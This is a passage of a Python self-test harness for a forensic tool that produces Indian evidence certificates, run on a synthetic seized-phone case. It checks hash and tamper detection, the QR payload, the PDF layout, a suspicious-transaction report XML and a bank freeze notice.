# --------------------------------------------------------------------------- #

def _forbidden_patterns() -> List["re.Pattern[str]"]:
    """The repealed provision and its statute, built so this file never spells them out."""
    sec = "6" + "5"
    return [re.compile(r"(?<![0-9a-fA-F])" + sec + r"\s*-?\s*B(?![0-9a-zA-Z])"),
            re.compile("Indian" + r"\s+" + "Evidence" + r"\s+" + "Act", re.IGNORECASE),
            re.compile(r"\bI\.?\s?E\.?\s?A\.?\s*,?\s*18" + "72")]


def _real_case(workdir: str, bad_sectors: Optional[List[int]] = None) -> Optional[Dict[str, str]]:
    """Run Sectors A, B and C on Sector B's synthetic case bundle (with a seizure recording and seals)."""
    sb = _load_sibling("sector_b_triage", "sector_b_triage.py")
    sc = _load_sibling("sector_c_graph", "sector_c_graph.py")
    if _sector_a is None or sb is None or sc is None:
        return None
    os.makedirs(workdir, exist_ok=True)
    bundle = sb._build_case_bundle()
    layout, blob = {}, bytearray()
    for name, data in bundle.items():
        pos = (len(blob) + 4095) // 4096 * 4096
        blob.extend(bytes(pos - len(blob)))
        layout[name] = (pos, len(data))
        blob.extend(data)
    blob.extend(bytes((-len(blob)) % 4096))
    image = os.path.join(workdir, "case_bundle.img")
    with open(image, "wb") as f:
        f.write(blob)
    video = os.path.join(workdir, "seizure_recording_sec105.mp4")
    _sector_a._write_synthetic_mp4(video)
    case = "FIR-042/2026-CYBER"
    vault = _sector_a.SutraEvidenceVault(
        case_id=case, output_dir=os.path.join(workdir, "sector_a"),
        hardware_telemetry={"make_model": "Android handset (Sector B synthetic case bundle)",
                            "serial_number": "R58N91XXXXX", "firmware_rev": "UP1A.231005"})
    vault.set_custody_seals("OPT-PUF-7Q2X-91A0", -112, "MK-CY-2026/089", "2026-10-18T09:30:00.000Z",
                            "OPT-PUF-7Q2X-91A0")
    vault.ingest_evidence(image, seizure_video_path=video, bad_sector_mask=bad_sectors)
    a_path = os.path.join(workdir, "sector_a", SECTOR_A_MANIFEST)
    orch = sb.SutraNeuralTriageOrchestrator(case, output_dir=workdir, device_owner="rahul")
    orch.bind_sector_a_manifest(a_path)
    kinds = {"events": ("process_events_jsonl", "SYSMON_EVENT_LOG_JSONL"),
             "whatsapp": ("whatsapp_log", "ANDROID_WHATSAPP_LOG"), "rppg": ("rppg_trace", "VIDEO_CALL_ROI_TRACE"),
             "registry": ("registry_export", "WINDOWS_REGISTRY_EXPORT"),
             "anydesk": ("anydesk_trace", "ANYDESK_CONNECTION_TRACE"), "upi": ("upi_csv", "UPI_TRANSACTION_EXPORT"),
             "chain": ("chain_csv", "BLOCKCHAIN_TRANSFER_EXPORT"), "chat": ("chat_transcript", "CHAT_TRANSCRIPT_TEXT"),
             "bugreport": ("bugreport", "ANDROID_BUGREPORT"), "apk": ("apk", "ANDROID_APK_FILE")}
    for name, (kind, stype) in kinds.items():
        if name not in layout:
            continue
        off, ln = layout[name]
        orch.add_artifact(name, kind, stype, path=image, base_offset=off, length=ln, extent=True,
                          display_path="case_bundle.img")
    orch.run(triage_time_utc="2026-10-20T14:30:00.000Z")
    b_path = os.path.join(workdir, sb.MANIFEST_FILENAME)
    out = os.path.join(workdir, "sector_c")
    sc.build_from_sector_outputs(a_path, b_path, workdir, out, case, generated_utc="2026-10-20T15:00:00.000000000Z")
    return {"a": a_path, "b": b_path, "c": os.path.join(out, STORYLINE_FILENAME), "image": image, "video": video,
            "root": workdir}


def _inside_frame(log: Sequence[Dict[str, Any]]) -> List[Dict[str, Any]]:
    lo, hi = INNER + 2, PAGE_W - INNER - 2
    return [t for t in log if t["x"] < lo or t["x"] + t["w"] > hi or t["y"] < INNER + 2 or t["y"] > PAGE_H - INNER - 2]


def _self_test(workdir: str) -> int:
    t_start = time.perf_counter()
    os.makedirs(workdir, exist_ok=True)
    for sub in ("real_case", "bad_sector_case", "tamper", "bundle", "pure", "demo", "leak"):
        shutil.rmtree(os.path.join(workdir, sub), ignore_errors=True)
    results: Dict[int, Tuple[str, Optional[bool], str]] = {}

    def check(n: int, name: str, ok: Optional[bool], detail: str = "") -> None:
        results[n] = (name, ok, detail)
        tag = "SKIP" if ok is None else ("PASS" if ok else "FAIL")
        print(f"  [{tag}] {n:>2}. {name}" + (f"  ({detail})" if detail else ""))

    def attempt(n: int, name: str, fn: Callable[[], Tuple[Optional[bool], str]]) -> None:
        try:
            ok, detail = fn()
        except Exception as e:  # a crash is a failed check, never a silent pass
            ok, detail = False, f"{type(e).__name__}: {e}"
        check(n, name, ok, detail)

    print("=" * 78)
    print(f"SUTRA-Trace Sector D self-test  ·  {LEGAL_VERSION} {LEGAL_REVISION}  ·  Python {sys.version.split()[0]}")
    fonts = FontSet()
    print(f"PDF engine: built-in (default){' + reportlab on request' if _HAVE_REPORTLAB else ''}  ·  QR: "
          f"{'qrcode package' if _qrcode_lib else 'built-in encoder'}  ·  fonts: {fonts.describe()}")
    print(f"Sector A module: {getattr(_sector_a, 'VAULT_VERSION', 'not found')}")
    print("=" * 78)
    print("Running Sectors A, B and C on the synthetic case bundle ...")
    real = _real_case(os.path.join(workdir, "real_case"))
    print("  done" if real else "  Sector A/B/C modules not found next to this file; real-pipeline checks will SKIP")
    custodian = {"name": "Inspector A. K. Rathore", "relation": "Investigating Officer",
                 "address": "Cyber Crime Police Station, Sector 18, Gandhinagar",
                 "designation": "Inspector of Police, Investigating Officer", "badge": "GJ-CCPS-1127",
                 "police_station": "Cyber Crime Police Station, Gandhinagar", "organisation": "Gujarat Police",
                 "place": "Gandhinagar"}
    expert = dict(_DEMO_EXPERT, name="Dr. S. Iyer")
    particulars = dict(_DEMO_CASE)

    def make(scenario: Any = ScenarioType.SUSPECT_HOSTILE, track: Any = TrackType.TRACK_39_2_OUTPUT,
             **kw: Any) -> BSACertificateGenerator:
        if real is None:
            return BSACertificateGenerator(scenario=scenario, track=track, generated_utc="2026-10-20T16:00:00.000Z",
                                           **kw)
        args = dict(evidence_manifest=real["a"], triage_manifest=real["b"], storyline=real["c"],
                    evidence_path=real["image"], seizure_video_path=real["video"], evidence_root=real["root"],
                    custodian=custodian, expert=expert, case_particulars=particulars,
                    generated_utc="2026-10-20T16:00:00.000Z")
        args.update(kw)
        return BSACertificateGenerator(scenario=scenario, track=track, **args)

    print("\nChecks")
    gen = make()
    ver = gen.verify()
    rows = {r["key"]: r for r in ver["hash_rows"]}
    print(f"  (case status {ver['status']}; blocking {len(ver['blocking'])}; notes: {'; '.join(ver['notes'])[:160]})")

    def c1() -> Tuple[bool, str]:
        g0 = BSACertificateGenerator(generated_utc="2026-10-20T16:00:00.000Z")
        v0 = g0.verify()
        bad = os.path.join(workdir, "demo", "broken.json")
        os.makedirs(os.path.dirname(bad), exist_ok=True)
        with open(bad, "w") as f:
            f.write("{not json")
        refused = 0
        for arg in (os.path.join(workdir, "demo", "missing.json"), bad):
            try:
                BSACertificateGenerator(arg)
            except LegalInputError:
                refused += 1
        return (g0.demo and g0.b is not None and g0.c is not None and v0["status"] != NOT_FIT
                and v0["anchors"]["verified"] == v0["anchors"]["total"] > 0 and refused == 2,
                f"built-in case {v0['status']}, {v0['anchors']['verified']}/{v0['anchors']['total']} anchors; "
                f"missing and broken files refused: {refused}/2")
    attempt(1, "Default manifests load as a self-verifying built-in case; bad inputs are refused", c1)

    def c2() -> Tuple[bool, str]:
        p = gen.generate_qr_payload()
        need = ("statute", "case", "evidence_id", "sha256", "merkle_root", "bound_root", "ts", "examiner", "cert")
        v = gen.view
        return (all(k in p for k in need) and p["statute"].startswith("BSA 2023 Sec 63") and p["sha256"] == v["sha256"]
                and p["merkle_root"] == v["merkle_root"] and p["cert"] == gen.certificate_digest()
                and BSACertificateGenerator.verify_qr_payload(p, gen.a, gen.certificate_data())["ok"],
                f"{len(json.dumps(p, separators=(',', ':')))} bytes, keys {', '.join(p)}")
    attempt(2, "QR payload carries the statutory keys and verifies against the manifest", c2)

    def c3() -> Tuple[bool, str]:
        path = gen.generate_qr_code_image(os.path.join(workdir, "demo", "cert_qr.png"))
        with open(path, "rb") as f:
            png = f.read()
        w, h = struct.unpack(">II", png[16:24])
        n = len(gen.qr_matrix()[0])
        dec = qr_decode(matrix_from_png(png))
        return (png[:8] == b"\x89PNG\r\n\x1a\n" and w == h == (n + 8) * 8 and dec == gen._qr_bytes(),
                f"{w}x{h} px, {n}x{n} modules (version {(n - 17) // 4}, ECC M), decoded back from the PNG")
    attempt(3, "QR PNG is valid, sized (modules + quiet zone) x scale, and decodes to the payload", c3)

    def c4() -> Tuple[bool, str]:
        g = make(ScenarioType.VICTIM_COOPERATIVE, custodian=dict(custodian, name="Rahul Mehta",
                                                                  designation="Complainant"))
        t = " ".join(g.part_a_declarations())
        return ("owned by me" in t and "Owned by me and Operated by me" in t and "lawful control" in t
                and g.certificate_data()["part_a"]["role"].startswith("Complainant"), g.scenario.part_a_role)
    attempt(4, "Victim scenario: PART A certifies personal ownership and lawful custody", c4)

    def c5() -> Tuple[bool, str]:
        t = " ".join(gen.part_a_declarations())
        need = ("Section 57, Explanation 5", "Section 105, Bharatiya Nagarik Suraksha Sanhita", "Article 20(3)",
                "has not been asked to sign", "audio-video")
        return (all(k in t for k in need) and "Investigating Officer" in gen.scenario.part_a_role,
                "I.O. signs; accused not asked to sign")
    attempt(5, "Hostile scenario: PART A cites s.57 Expl. 5 BSA and s.105 BNSS; suspect not compelled", c5)

    def c6() -> Tuple[bool, str]:
        g = make(ScenarioType.INTERMEDIARY_NODAL)
        t = " ".join(g.part_a_declarations())
        return ("Section 94, Bharatiya Nagarik Suraksha Sanhita" in t and "ordinary course of business" in t
                and g._source_type() == "Server", f"source ticked: {g._source_type()}")
    attempt(6, "Intermediary scenario: PART A cites the s.94 BNSS notice and ordinary-course server logs", c6)

    def c7() -> Tuple[bool, str]:
        g = make(track=TrackType.TRACK_39_1_DIRECT)
        t = " ".join(g.part_a_declarations())
        return ("Explanations 4 to 7" in t and "bit-stream copy" in t and "Section 63(2) of the Adhiniyam" not in t,
                g.track.statutory_route)
    attempt(7, "Track 39(1) direct: primary electronic record route selected", c7)

    def c8() -> Tuple[bool, str]:
        t = " ".join(gen.part_a_declarations())
        return (all(k in t for k in ("Section 63(2)", "(a) it was produced", "(b) during that period", "(c) throughout",
                                     "(d) the information")), gen.track.statutory_route)
    attempt(8, "Track 39(2) output: Section 63(2)(a)-(d) regular-operation conditions certified", c8)

    tamper = None
    if real is not None:
        tdir = os.path.join(workdir, "tamper")
        os.makedirs(tdir, exist_ok=True)
        with open(real["image"], "rb") as f:
            buf = bytearray(f.read())
        buf[len(buf) // 2] ^= 0x01
        timg = os.path.join(tdir, "case_bundle.img")
        with open(timg, "wb") as f:
            f.write(buf)
        with open(real["video"], "rb") as f:
            vb = bytearray(f.read())
        vb[-100] ^= 0x01
        tvid = os.path.join(tdir, "seizure_recording_sec105.mp4")
        with open(tvid, "wb") as f:
            f.write(vb)
        tamper = make(evidence_path=timg, seizure_video_path=tvid, evidence_root=tdir)

    def c9() -> Tuple[Optional[bool], str]:
        if tamper is None:
            return rows["sha256"]["status"] == MATCH_EVIDENCE, "built-in case only"
        tv = tamper.verify()
        tr = {r["key"]: r for r in tv["hash_rows"]}
        return (rows["sha256"]["status"] == MATCH_EVIDENCE and tr["sha256"]["status"] == MISMATCH and
                tv["status"] == NOT_FIT and "unable to certify" in " ".join(tamper.part_b_paragraphs()),
                f"untouched: {rows['sha256']['status']}; one flipped bit: {tr['sha256']['status']} -> {tv['status']}")
    attempt(9, "Hash table: SHA-256 re-hashed from evidence; a flipped bit makes it NOT FIT", c9)

    def c10() -> Tuple[bool, str]:
        tree = rows.get("tree")
        ok_tree = tree is None or tree["status"] in (MATCH_SECTOR_A, RECORDED_ONLY)
        return (rows["blake2b"]["status"] == MATCH_EVIDENCE and ok_tree,
                f"BLAKE2b-512 {rows['blake2b']['status']}; tree hash "
                f"{(tree or {}).get('algorithm', 'n/a')} {(tree or {}).get('status', 'n/a')}")
    attempt(10, "Hash table: BLAKE2b-512 (and the BLAKE3 / BLAKE2s tree via Sector A) match", c10)

    def c11() -> Tuple[bool, str]:
        ok = rows["merkle_root"]["status"] == MATCH_EVIDENCE
        if tamper is not None:
            tv = tamper.verify()
            ok = ok and any("chunk roots differ" in b for b in tv["blocking"])
        return ok, f"{rows['merkle_root']['status']}; tamper localised to its 4 MB chunk"
    attempt(11, "Hash table: RFC 6962 Merkle root recomputed from 1 KB leaves", c11)

    def c12() -> Tuple[bool, str]:
        ok = rows["video_sha"]["status"] == MATCH_EVIDENCE
        detail = rows["video_sha"]["status"]
        if tamper is not None:
            tr = {r["key"]: r for r in tamper.verify()["hash_rows"]}
            ok = ok and tr["video_sha"]["status"] == MISMATCH
            detail += f"; altered recording: {tr['video_sha']['status']}"
        return ok, detail
    attempt(12, "Hash table: Section 105 BNSS seizure recording re-hashed", c12)

    def c13() -> Tuple[bool, str]:
        m = json.loads(json.dumps(gen.a))
        m["cryptographic_hashes"]["final_bound_evidence_root"] = "0" * 64
        g = BSACertificateGenerator(m, scenario=ScenarioType.SUSPECT_HOSTILE, generated_utc=gen.generated_utc)
        r = {x["key"]: x for x in g.verify()["hash_rows"]}
        return (rows["bound_root"]["status"] == MATCH_RECOMPUTED and r["bound_root"]["status"] == MISMATCH and
                g.verify()["status"] == NOT_FIT, f"{rows['bound_root']['status']}; forged bound root -> MISMATCH")
    attempt(13, "Hash table: final bound evidence root recomputes; a forged one is caught", c13)

    gen.build_certificate_pdf(os.path.join(workdir, "demo", "cert_main.pdf"))
    rec = gen.last_render["recorder"]
    p1, p2 = rec.page_text(1), rec.page_text(2)

    def c14() -> Tuple[bool, str]:
        s = gen.certificate_data()["part_b"]["section45"]
        return (s["checks_evaluated"] == 14 and "Points evaluated" in p2 and
                re.search(r"\b14 \(Annexure X", p2) is not None, f"{s['checks_evaluated']} points in PART B")
    attempt(14, "Section 45 BSA: 14 points evaluated and embedded in PART B", c14)

    def c15() -> Tuple[bool, str]:
        s = gen.section45_summary()
        sb = gen.b["section45_exculpatory_checklist"]
        data = gen.certificate_data()["part_b"]["section45"]
        return (s["ratio_consistent"] and s["display"] in p2.replace("\n", " ") and
                data["trojan_defense_probability"] == sb["trojan_defense_probability"],
                f"{s['display']}; Sector B trojan_defense_probability {sb['trojan_defense_probability']} kept as "
                f"{data['trojan_defense_probability']}")
    attempt(15, "Section 45 BSA: exculpatory indicator ratio shown and re-derived; Sector B key kept", c15)

    notice = gen.generate_sec_106_bnss_freeze_notice()
    cl = gen.cluster_data()

    def c16() -> Tuple[bool, str]:
        tv = [t["vpa"] for t in notice["targets"]]
        return (notice["hub_vpa"] == cl["hub_vpa"] and cl["hub_vpa"] in tv and
                all(m in tv for m in cl["mule_vpas"]) and len(cl["mule_vpas"]) >= 1 and
                all(m in notice["text"] for m in cl["mule_vpas"]),
                f"hub {notice['hub_vpa']}, mules {', '.join(cl['mule_vpas'])}, {len(notice['addressees'])} banks")
    attempt(16, "Freeze notice names the hub VPA and every mule, bank by bank", c16)

    def c17() -> Tuple[bool, str]:
        return ("Section 106, Bharatiya Nagarik Suraksha Sanhita" in notice["statute"] and
                "Section 107, Bharatiya Nagarik Suraksha Sanhita" in notice["statute"] and
                "17(1A)" not in notice["statute"] and notice["text"].startswith(gen.FREEZE_TITLE) and
                "SECTION 66(2) PMLA" in notice["text"] and "FOR ACTION UNDER SECTION 17(1A)" in notice["text"] and
                notice["pmla_referral"]["order_issued_by_police"] is False, notice["statute"] + "; PMLA by referral")
    attempt(17, "Freeze notice: Section 106 read with 107 BNSS; Section 17(1A) PMLA only by referral", c17)

    xml = gen.generate_fiu_ind_str_xml()
    xroot = ET.fromstring(xml)
    ns = {"s": STR_NAMESPACE}

    def c18() -> Tuple[bool, str]:
        return (xroot.tag == f"{{{STR_NAMESPACE}}}FINnet2_STR" and validate_str_xml(xml) == [],
                f"{len(xml)} bytes, root <FINnet2_STR xmlns=\"{STR_NAMESPACE}\">")
    attempt(18, "FIU-IND STR XML is well-formed with the FINnet2_STR root and passes its structure check", c18)

    def c19() -> Tuple[bool, str]:
        lead_rrns = set()
        for ld in gen.b["symbolic_anchors"]:
            if ld.get("threat_category") in ("RAPID_UPI_SMURFING", "CROSS_CHAIN_BRIDGE", "INVALID_NPCI_RRN"):
                for _p, val in _walk_kv(ld.get("lead_details") or {}, "rrn"):
                    lead_rrns.add(str(val))
        got = {e.text for e in xroot.findall("s:SuspiciousTransactionDetails/s:RetrievalReferenceNumbers/s:RRN", ns)}
        return (bool(lead_rrns) and lead_rrns <= got, f"{len(got)} RRN tags for {len(lead_rrns)} flagged RRNs")
    attempt(19, "STR XML carries every flagged NPCI RRN", c19)

    def c20() -> Tuple[bool, str]:
        got = {e.text for e in xroot.findall("s:SuspiciousTransactionDetails/s:MuleAccounts/s:MuleAccount/s:VPA", ns)}
        return (set(cl["mule_vpas"]) <= got and len(got) >= len(cl["mule_vpas"]),
                f"{len(got)} accounts ({len(cl['mule_vpas'])} tier-1 mules)")
    attempt(20, "STR XML carries every flagged mule account", c20)

    insp = pdf_inspect(os.path.join(workdir, "demo", "cert_main.pdf"))

    def c21() -> Tuple[bool, str]:
        outside = _inside_frame(rec.text_log)
        return (insp["page_count"] == 2 and len(rec.pages) == 2 and not outside,
                f"{gen.last_render['certificate']['engine']}, {insp['page_count']} pages, "
                f"{len(rec.text_log)} text runs inside the frame" + (f", {len(outside)} outside" if outside else ""))
    attempt(21, "Certificate PDF has exactly 2 A4 pages with all text inside the double frame", c21)

    def c22() -> Tuple[bool, str]:
        return (insp["bytes"] > 10 * 1024 and insp["header"].startswith("%PDF-") and insp["eof"],
                f"{insp['bytes']} bytes, {insp['header'].strip()}; {gen.last_render['certificate']['pdfa']}")
    attempt(22, "Certificate PDF is over 10 KB and starts with %PDF-", c22)

    def c23() -> Tuple[bool, str]:
        titles = {t: p for t, p in insp["outlines"]}
        a_page = next((p for t, p in titles.items() if t.startswith("PART A")), None)
        b_page = next((p for t, p in titles.items() if t.startswith("PART B")), None)
        return ("THE SCHEDULE - PART A" in p1 and "THE SCHEDULE - PART B" in p2 and "PART B" not in p1.split("\n")[3]
                and a_page in (1, None) and b_page in (2, None) and len(titles) == 2,
                f"outlines {sorted(titles)} -> pages {a_page}, {b_page}")
    attempt(23, "PART A is page 1 and PART B is page 2", c23)

    def c24() -> Tuple[bool, str]:
        name, ps = gen.custodian.get("name", ""), gen.custodian.get("police_station", "")
        return (bool(name) and name in p1 and bool(ps) and ps in p1, f"{name}; {ps}")
    attempt(24, "PART A signature block carries the custodian's name and police station", c24)

    def c25() -> Tuple[bool, str]:
        return ("Section 79A IT Act" in p2 and "Section 79A, Information Technology Act, 2000" in p2,
                "79A notification row and opinion basis")
    attempt(25, "PART B signature block carries the Section 79A IT Act accreditation", c25)

    def c26() -> Tuple[bool, str]:
        return ("RFC 3161 timestamp token" in p2 and gen.view["tsa_status"][:20] in p2, gen.view["tsa_status"])
    attempt(26, "PART B signature block carries the RFC 3161 timestamp token status", c26)

    def c27() -> Tuple[bool, str]:
        d = os.path.join(workdir, "leak")
        os.makedirs(d, exist_ok=True)
        before_cwd, before_d = set(os.listdir(os.getcwd())), set(os.listdir(d))
        g = make()
        out = g.build_certificate_pdf(os.path.join(d, "cert.pdf"))
        new_cwd = set(os.listdir(os.getcwd())) - before_cwd
        new_d = set(os.listdir(d)) - before_d
        i2 = pdf_inspect(out)
        grid = extract_qr_from_page(i2["page_streams"][0])
        dec = qr_decode(grid) if grid else b""
        return (new_d == {"cert.pdf"} and not new_cwd and not i2["temp_refs"] and dec == g._qr_bytes(),
                f"QR rebuilt from the page 1 vector runs decodes to the payload; new files: {sorted(new_d | new_cwd)}")
    attempt(27, "QR embedded as vectors in PART A with no temporary files", c27)

    def c28() -> Tuple[Optional[bool], str]:
        if real is None:
            return None, "Sector A module not available"
        with open(real["a"], encoding="utf-8") as f:
            am = json.load(f)
        h = am["cryptographic_hashes"]
        table = {r["key"]: r for r in gen.verify()["hash_rows"]}
        pairs = (("sha256", "sha256_linear_primary"), ("blake2b", "blake2b_secondary"),
                 ("merkle_root", "sha256_merkle_root_4mb"), ("video_sha", "bnss_105_seizure_video_sha256"),
                 ("bound_root", "final_bound_evidence_root"))
        ok = all(table[k]["recorded"] == h[f] and table[k]["status"].startswith("MATCH") for k, f in pairs)
        sa = gen.verify()["sector_a_verifier"]
        return (ok and gen.view["evidence_id"] == am["evidence_id"] and (sa is None or sa[0]),
                f"{len(pairs)} digests mapped and matched; Sector A verifier: {sa[1] if sa else 'not run'}")
    attempt(28, "Real Sector A manifest: hashes mapped into the certificate and verified", c28)

    def c29() -> Tuple[Optional[bool], str]:
        if real is None:
            return None, "Sector B module not available"
        with open(real["b"], encoding="utf-8") as f:
            bm = json.load(f)
        an = gen.verify()["anchors"]
        b_refs = [e for e in an["items"] if any(r.startswith("B ") for r in e["refs"])]
        s = gen.certificate_data()["part_b"]["section45"]
        return (s["checks_evaluated"] == bm["summary_metrics"]["exculpatory_checks_evaluated"] and
                s["trojan_defense_probability"] == bm["summary_metrics"]["trojan_defense_probability"] and
                all(e["status"] == "MATCH" for e in b_refs) and len(b_refs) > 0 and
                len(bm["symbolic_anchors"]) == len(gen.b["symbolic_anchors"]),
                f"{len(bm['symbolic_anchors'])} leads, {len(b_refs)} distinct B anchors re-hashed, metrics mapped")
    attempt(29, "Real Sector B manifest: summary metrics and leads mapped, anchors re-hashed", c29)

    gen.build_annexure_pdf(os.path.join(workdir, "demo", "annex_main.pdf"))
    arec = gen.last_render["annex_recorder"]

    def c30() -> Tuple[Optional[bool], str]:
        if real is None:
            return None, "Sector C module not available"
        steps = gen.c["steps"]
        atext = "\n".join(t["text"] for t in arec.text_log)
        first_words = all(str(st.get("narrative", ""))[:18] in atext for st in steps)
        an = gen.verify()["anchors"]
        c_refs = [e for e in an["items"] if any(r.startswith("C ") for r in e["refs"])]
        outside = _inside_frame(arec.text_log)
        return (first_words and "ANNEXURE S" in atext and all(e["status"] == "MATCH" for e in c_refs) and not outside,
                f"{len(steps)} steps in Annexure S, {len(c_refs)} C anchors re-hashed, {arec.page_no} annexure pages")
    attempt(30, "Real Sector C storyline: steps laid out in the legal annexure with anchors", c30)

    def c31() -> Tuple[Optional[bool], str]:
        if real is None:
            return None, "Sector A module not available"
        bad_case = _real_case(os.path.join(workdir, "bad_sector_case"), bad_sectors=[3, 7])
        g = BSACertificateGenerator(bad_case["a"], bad_case["b"], bad_case["c"], evidence_path=bad_case["image"],
                                    seizure_video_path=bad_case["video"], evidence_root=bad_case["root"],
                                    custodian=custodian, expert=expert, case_particulars=particulars,
                                    generated_utc=gen.generated_utc)
        v = g.verify()
        r = {x["key"]: x for x in v["hash_rows"]}
        g.build_annexure_pdf(os.path.join(workdir, "bad_sector_case", "annex.pdf"))
        atext = "\n".join(t["text"] for t in g.last_render["annex_recorder"].text_log)
        return ("BS: Bad-sector manifest" in g.certificate_data()["annexures"] and "ANNEXURE BS" in atext and
                r["sha256"]["status"] == MATCH_EVIDENCE and r["sha256_valid"]["status"] == MATCH_EVIDENCE and
                any("unreadable sector" in n for n in v["notes"]),
                f"sectors [3, 7] filled 0xDEADBEEF; image SHA-256 {r['sha256']['status']}; status {v['status']}")
    attempt(31, "Bad sectors reported by Sector A attach the Bad-Sector Manifest note", c31)

    bundle_dir = os.path.join(workdir, "bundle")
    t0 = time.perf_counter()
    gb = make()
    paths = gb.export_legal_bundle(bundle_dir)
    elapsed = time.perf_counter() - t0

    def c32() -> Tuple[bool, str]:
        with open(paths["bundle_manifest"], encoding="utf-8") as f:
            bm = json.load(f)
        ok = all(os.path.isfile(p) for p in paths.values())
        for name, meta in bm["files"].items():
            with open(os.path.join(bundle_dir, name), "rb") as f:
                ok = ok and _sha256_hex(f.read()) == meta["sha256"]
        need = {CERT_PDF, STR_XML, FREEZE_JSON, QR_PNG}
        return (ok and need <= set(os.listdir(bundle_dir)), f"{len(bm['files'])} files hashed in {BUNDLE_MANIFEST}")
    attempt(32, "Legal package: certificate PDF, STR XML, freeze notice JSON and QR PNG exported", c32)

    def c33() -> Tuple[bool, str]:
        d = os.path.join(workdir, "pure")
        g = make(pdf_engine="pure", qr_engine="builtin")
        out = g.build_certificate_pdf(os.path.join(d, "cert_pure.pdf"))
        i3 = pdf_inspect(out)
        grid = extract_qr_from_page(i3["page_streams"][0])
        plain = make(pdf_engine="pure", qr_engine="builtin", embed_fonts=False)
        out2 = plain.build_certificate_pdf(os.path.join(d, "cert_base14.pdf"))
        i4 = pdf_inspect(out2)
        stream_text = b"\n".join(i4["page_streams"])
        cross = "qrcode package absent"
        if _qrcode_lib is not None:
            data = g._qr_bytes()
            mine = g.qr_matrix()[0]
            ver = (len(mine) - 17) // 4
            same = True
            for mk in range(8):
                q = _qrcode_lib.QRCode(version=ver, error_correction=_qrcode_lib.constants.ERROR_CORRECT_M,
                                       box_size=1, border=0, mask_pattern=mk)
                q.add_data(data, optimize=0)
                q.make(fit=False)
                same = same and [[bool(x) for x in r] for r in q.get_matrix()] == qr_encode(data, "M", mask=mk)
            cross = f"built-in encoder identical to qrcode for all 8 masks: {same}"
            if not same:
                return False, cross
        return (i3["page_count"] == 2 and grid is not None and qr_decode(grid) == g._qr_bytes() and
                i4["page_count"] == 2 and b"THE SCHEDULE - PART A" in stream_text and not i4["pdfaid"] and
                "withheld" in plain.last_render["certificate"]["pdfa"],
                f"built-in writer + built-in QR: {i3['bytes']} B; base-14 variant {i4['bytes']} B with PDF/A claim "
                f"withheld; {cross}")
    attempt(33, "Pure-Python fallback: built-in PDF writer and QR encoder work without reportlab / qrcode", c33)

    def c34() -> Tuple[bool, str]:
        with open(os.path.abspath(__file__), encoding="utf-8") as f:
            src = f.read()
        texts = [src, xml, notice["text"], json.dumps(gen.certificate_data()),
                 "\n".join(t["text"] for t in rec.text_log), "\n".join(t["text"] for t in arec.text_log)]
        for p in paths.values():
            if p.endswith((".xml", ".json", ".txt")):
                with open(p, encoding="utf-8") as f:
                    texts.append(f.read())
        hits = sum(len(rx.findall(t)) for rx in _forbidden_patterns() for t in texts)
        cites = src.count("Bharatiya Sakshya Adhiniyam")
        return (hits == 0 and "Section 63" in p1, f"0 hits expected, {hits} found across source and "
                                                  f"{len(texts) - 1} outputs; BSA cited {cites} times in source")
    attempt(34, "Zero references to the repealed provision or statute, in code and in every output", c34)

    check(35, "Full legal bundle (verify, 2 PDFs, STR, notice, QR) generated in under 2 s", elapsed < 2.0,
          f"{elapsed:.2f} s with {gb.last_render['certificate']['engine']}")

    regress = _audit_regression(workdir, real, make, gen, rec, tamper, custodian, expert, particulars)

    print("\nCertificate status:", ver["status"])
    for b in ver["blocking"]:
        print("  BLOCKING:", b)
    for n in ver["notes"]:
        print("  note:", n)
    print(f"Outputs: {bundle_dir}")
    print(f"Elapsed {time.perf_counter() - t_start:.1f} s")
    passed = sum(1 for _, ok, _ in results.values() if ok)
    skipped = sum(1 for _, ok, _ in results.values() if ok is None)
    print(f"\n{passed}/{len(results)} checks passed" + (f", {skipped} skipped" if skipped else ""))
    r_pass = sum(1 for _, ok, _ in regress.values() if ok)
    r_skip = sum(1 for _, ok, _ in regress.values() if ok is None)
    print(f"{r_pass}/{len(regress)} audit regression checks passed" + (f", {r_skip} skipped" if r_skip else ""))
    return 0 if passed + skipped == len(results) and r_pass + r_skip == len(regress) else 1


def _audit_regression(workdir: str, real: Optional[Dict[str, str]], make: Callable[..., "BSACertificateGenerator"],
                      gen: "BSACertificateGenerator", rec: PageRecorder, tamper: Optional["BSACertificateGenerator"],
                      custodian: Dict[str, Any], expert: Dict[str, Any],
                      particulars: Dict[str, Any]) -> Dict[str, Tuple[str, Optional[bool], str]]:
    """Regression checks for the judicial-admissibility audit (V-01 to V-08, directives 1 to 8)."""
    results: Dict[str, Tuple[str, Optional[bool], str]] = {}
    print("\nAudit regression checks")

    def attempt(code: str, name: str, fn: Callable[[], Tuple[Optional[bool], str]]) -> None:
        try:
            ok, detail = fn()
        except Exception as e:  # a crash is a failed check
            ok, detail = False, f"{type(e).__name__}: {e}"
        results[code] = (name, ok, detail)
        tag = "SKIP" if ok is None else ("PASS" if ok else "FAIL")
        print(f"  [{tag}] {code}. {name}" + (f"  ({detail})" if detail else ""))

    demo = demo_case()
    p2 = rec.page_text(2)

    def reseal(a: Dict[str, Any]) -> Dict[str, Any]:
        a["manifest_canonical_sha256"] = _sha256_hex(canonical_json_a(
            {k: x for k, x in a.items() if k != "manifest_canonical_sha256"}))
        return a

    def r01() -> Tuple[bool, str]:
        ta = " ".join(gen.part_a_declarations())
        tb = " ".join(gen.part_b_paragraphs())
        ws = gen.view["workstation"]
        d = make(track=None)
        legacy = _coerce_enum("TRACK_39_2_OUTPUT", TrackType)
        cert_json = json.dumps(gen.certificate_data())
        return ("Section 57, Explanation 5" in ta and f"forensic workstation {ws}" in ta and
                "as to that workstation only" in ta and "accused's device was used regularly" in ta and
                f"forensic workstation {ws}" in tb and "they are not stated for the seized device" in tb and
                gen.certificate_data()["statutory_code"] == "SEC_63_2_OUTPUT" and
                d.track == TrackType.SEC_57_PRIMARY and legacy is TrackType.SEC_63_2_OUTPUT and
                TrackType.TRACK_39_1_DIRECT is TrackType.SEC_57_PRIMARY and "TRACK_39" not in cert_json,
                f"hostile + output: s.63(2) stated for {ws} only; hostile default {d.track.value}; "
                f"legacy names accepted, absent from JSON")
    attempt("R01", "V-01: hostile scenario keeps the seized exhibit primary; s.63(2) only for the workstation", r01)

    def r02() -> Tuple[bool, str]:
        g = BSACertificateGenerator(scenario=ScenarioType.VICTIM_COOPERATIVE, generated_utc=gen.generated_utc)
        badge = g.custodian["badge"]
        blob = json.dumps(g.certificate_data()) + json.dumps(_DEMO_PARTIES)
